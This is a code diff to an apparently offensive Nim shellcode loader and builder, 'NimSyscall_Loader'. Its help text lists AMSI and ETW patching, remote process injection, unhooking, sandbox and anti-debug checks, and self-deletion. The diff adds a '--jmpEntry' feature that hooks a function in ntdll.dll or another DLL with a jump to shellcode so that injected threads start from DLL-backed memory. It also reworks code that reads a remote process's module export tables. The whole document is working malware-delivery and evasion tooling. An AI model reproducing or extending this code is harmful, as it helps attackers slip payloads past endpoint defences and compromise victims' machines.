@@ -65,7 +65,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.9
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc>]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -151,6 +151,9 @@ Options:
                  This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
   --noAntidebug    Leave out AntiDebugger Checks
   --noDefaultSandBox    Leave out default Sandbox Checks
+  --jmpEntry    This option will enable a custom Shellcode Entrypoint from a DLL backed function to avoid unbacked memory as Thread/APC start address. The target function will be hooked with a JMP to the Shellcode
+    --jmpEntryDLL value    Specify a DLL to use for the custom Shellcode Entrypoint
+    --jmpEntryFunc value    Specify a function to use for the custom Shellcode Entrypoint
 
 [Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
 
@@ -297,6 +300,9 @@ var
     defaultSandBoxChecks: bool = true
     remoteMapSection: bool = false
     remoteinject: bool = false
+    jmpEntry: bool = false
+    jmpEntryDLL: string = "ntdll.dll"
+    jmpEntryFunction: string = "RtlpWow64CtxFromAmd64"
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.9")
 
@@ -350,6 +356,17 @@ if args["--QueueApc"]:
 
 if args["--noWait"]:
     wait = false
+
+if args["--jmpEntry"]:
+    jmpEntry = true
+
+if args["--jmpEntryDLL"]:
+    let dllname = args["--jmpEntryDLL"]
+    jmpEntryDLL = fmt"{dllname}"
+
+if args["--jmpEntryFunc"]:
+    let funcname = args["--jmpEntryFunc"]
+    jmpEntryFunction = fmt"{funcname}"
 
 if args["--csharp"]:
   csharp = true
@@ -659,6 +676,11 @@ if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (p
 if (dllclone and dllProxy):
     echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
     quit(1)
+
+if((existingprocessInjection == false) and (remoteinject) and jmpEntry):
+    if (jmpEntryDll != "ntdll.dll"):
+        echo "Error: You can only use ntdll.dll functions for SpawnInject, because the Process is suspended and only ntdll.dll is loaded. Other DLLs can only be used when using --remoteprocess for Processes, that already have the target DLL loaded!"
+        quit(1)
 
 if (psout and dll_out):
     # Reflective DLL PE-Loading only works, when DLLMain is exposed, otherwise it won't work
@@ -1465,6 +1487,10 @@ when defined(remoteinject):
     from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
     import osproc,os
 
+when defined(JmpEntry):
+    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+
 when defined(COMVARETW):
     import osproc,os
     from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
@@ -1583,6 +1609,11 @@ for i in 0 ..< rowLen:
 """
 
 let Cryptstub15 = fmt"""
+
+when defined(JmpEntry):
+    var jmpMod: string = obf("{jmpEntryDLL}")
+    var jmpFunc: string = obf("{jmpEntryFunction}")
+
 when defined(SkipDefaultSandBoxChecks):
     when defined(AntiDebug):
         var envkey = obf("{firstwithoutlast4}")
@@ -1726,111 +1757,111 @@ discard calcHard()
 
 let RemoteModuleHandleStub = """
 
-    # Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim
+# Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim
 
 
-    proc ConvertToString(CharArr :array[256,char]): string =
-        var index = 0
-        while CharArr[index] != '\x00':
-            result.add(CharArr[index])
-            index += 1
+proc ConvertToString(CharArr :array[256,char]): string =
+    var index = 0
+    while CharArr[index] != '\x00':
+        result.add(CharArr[index])
+        index += 1
 
-    proc GetRemoteModuleHandle  (hProcess:HANDLE, ModuleName: string): HMODULE =
-        var 
-            modEntry : MODULEENTRY32A
-            snapshot : HANDLE
+proc GetRemoteModuleHandle  (hProcess:HANDLE, ModuleName: string): HMODULE =
+    var 
+        modEntry : MODULEENTRY32A
+        snapshot : HANDLE
 
-        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
-        if snapshot != INVALID_HANDLE_VALUE:
-            modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
-            if Module32FirstA(snapshot, addr modEntry):
-                while Module32NextA(snapshot, addr modEntry):
-                    if ConvertToString(modEntry.szModule) == ModuleName:
-                        return modEntry.hModule
-        CloseHandle(snapshot)
-        return 0
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
+    if snapshot != INVALID_HANDLE_VALUE:
+        modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
+        if Module32FirstA(snapshot, addr modEntry):
+            while Module32NextA(snapshot, addr modEntry):
+                if toLowerAscii(ConvertToString(modEntry.szModule)) == toLowerAscii(ModuleName):
+                    return modEntry.hModule
+    CloseHandle(snapshot)
+    return 0
 
-    proc GetRemoteProcAddress  (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
-        var
-            baseModule : UINT_PTR = cast[UINT64](hModule)
-            dosHeader : IMAGE_DOS_HEADER
-            ntHeader : IMAGE_NT_HEADERS
-            exportDirectory : IMAGE_EXPORT_DIRECTORY
-            ExportTable : DWORD = 0
-            ExportFunctionTableVA : UINT_PTR = 0
-            ExportNameTableVA : UINT_PTR = 0
-            ExportOrdinalTableVA : UINT_PTR = 0
-            ExportNameTable: seq[DWORD]
-            ExportFunctionTable: seq[DWORD]
-            ExportOrdinalsTable: seq[WORD] 
-            MinFunNumber : UINT_PTR = 0
-            Func : DWORD = 0
-            Ord : WORD = 0
-            CharIndex : UINT_PTR = 0
-            TempChar : char
-            Done : bool = false
-            TempFunctionName : string = ""
+proc GetRemoteProcAddress  (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
+    var
+        baseModule : UINT_PTR = cast[UINT64](hModule)
+        dosHeader : IMAGE_DOS_HEADER
+        ntHeader : IMAGE_NT_HEADERS
+        exportDirectory : IMAGE_EXPORT_DIRECTORY
+        ExportTable : DWORD = 0
+        ExportFunctionTableVA : UINT_PTR = 0
+        ExportNameTableVA : UINT_PTR = 0
+        ExportOrdinalTableVA : UINT_PTR = 0
+        ExportNameTable: seq[DWORD]
+        ExportFunctionTable: seq[DWORD]
+        ExportOrdinalsTable: seq[WORD] 
+        MinFunNumber : UINT_PTR = 0
+        Func : DWORD = 0
+        Ord : WORD = 0
+        CharIndex : UINT_PTR = 0
+        TempChar : char
+        Done : bool = false
+        TempFunctionName : string = ""
 
-        if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
-            when defined(verbose):
-                echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
-            return NULL
-        if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
-            when defined(verbose):
-                echo obf("Failed to Read and check the NT signature: "), GetlastError()
-            return NULL
-
-        ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
-        
-        if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
-            when defined(verbose):
-                echo obf("Failed to Read the main export table "), GetlastError()
-
-        ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
-        ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
-        ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
-        
-        for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
-            Func = 0
-            Ord = 0 
-            if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
-                when defined(verbose):
-                    echo obf("Failed to copy name table "), GetlastError()
-                return NULL
-            if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
-                when defined(verbose):
-                    echo obf("Failed to copy Ordinal table "), GetlastError()
-                return NULL
-            ExportNameTable.add(Func)
-            ExportOrdinalsTable.add(Ord)
-        
-        for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
-            Func = 0
-            if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
-                when defined(verbose):
-                    echo obf("Failed to copy fucntion table "), GetlastError()
-                return NULL
-            ExportFunctionTable.add(Func)
-        
-        for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
-            CharIndex = 0
-            Done = false
-            TempFunctionName = ""
-            while Done == false:
-                if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
-                    when defined(verbose):
-                        echo obf("Failed to read the names of the functions"), GetlastError()
-                    return NULL
-                if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
-                    Done = true
-                else:
-                    TempFunctionName.add(TempChar)
-                CharIndex += 1
-            if TempFunctionName == FuncName:
-                return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
+    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
         when defined(verbose):
-            echo obf("[X] Proc name does not exits")
+            echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
         return NULL
+    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
+        when defined(verbose):
+            echo obf("Failed to Read and check the NT signature: "), GetlastError()
+        return NULL
+
+    ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
+    
+    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
+        when defined(verbose):
+            echo obf("Failed to Read the main export table "), GetlastError()
+
+    ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
+    ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
+    ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
+    
+    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
+        Func = 0
+        Ord = 0 
+        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+            when defined(verbose):
+                echo obf("Failed to copy name table "), GetlastError()
+            return NULL
+        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
+            when defined(verbose):
+                echo obf("Failed to copy Ordinal table "), GetlastError()
+            return NULL
+        ExportNameTable.add(Func)
+        ExportOrdinalsTable.add(Ord)
+    
+    for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
+        Func = 0
+        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+            when defined(verbose):
+                echo obf("Failed to copy fucntion table "), GetlastError()
+            return NULL
+        ExportFunctionTable.add(Func)
+    
+    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
+        CharIndex = 0
+        Done = false
+        TempFunctionName = ""
+        while Done == false:
+            if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
+                when defined(verbose):
+                    echo obf("Failed to read the names of the functions"), GetlastError()
+                return NULL
+            if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
+                Done = true
+            else:
+                TempFunctionName.add(TempChar)
+            CharIndex += 1
+        if toLowerAscii(TempFunctionName) == toLowerAscii(FuncName):
+            return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
+    when defined(verbose):
+        echo obf("[X] Proc name does not exits")
+    return NULL
 
 """
 
@@ -2262,6 +2293,14 @@ if (AMSIPatch or AMSIProviderPatch or ETWPatch or peload or (localinject == fals
         if (selfdelete):
             stub.add(DInvokeSelfDeleteStubs)
 
+if (remoteETWpatch or remoteAMSIpatch or jmpEntry):
+    stub.add(RemoteModuleHandleStub)
+    #if (unhook == false):
+    #    if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
+
+if(jmpEntry):
+    stub.add(CustomThreadEntryStub)
+
 stub.add(MainStub)
 
 stub.add(getRandStub())
@@ -2317,10 +2356,6 @@ if (localinject):
         else:
             stub.add(ETWStub)
 stub.add(getRandStub())
-if (remoteETWpatch or remoteAMSIpatch):
-    stub.add(RemoteModuleHandleStub)
-    if (unhook == false):
-        if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
 stub.add(getRandStub())
 if (peload):
     if (localinject):
@@ -2616,6 +2651,9 @@ if(AMSIProviderPatch):
 
 if(RWX == false):
     basicCompileFlags.add("-d:RX ")
+
+if(jmpEntry):
+    basicCompileFlags.add("-d:JmpEntry ")
 
 if(selfdelete):
     basicCompileFlags.add("-d:SelfDelete ")
